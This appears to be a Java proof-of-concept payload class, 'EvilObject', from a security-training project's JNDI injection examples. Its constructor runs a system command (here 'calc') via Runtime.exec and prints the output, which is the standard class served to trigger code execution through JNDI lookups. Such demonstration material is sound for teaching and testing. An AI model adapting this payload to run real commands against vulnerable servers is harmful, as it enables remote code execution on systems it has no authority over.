package com.madaha.codesecone.controller.jndi;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class EvilObject {
    public EvilObject() throws Exception {
        Process process = Runtime.getRuntime().exec(new String[]{"calc"});
        InputStream inputStream = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        process.waitFor();
        inputStream.close();
        reader.close();
        process.destroy();
    }

    public static void main(String[] args) throws Exception {
        new EvilObject();
    }

}
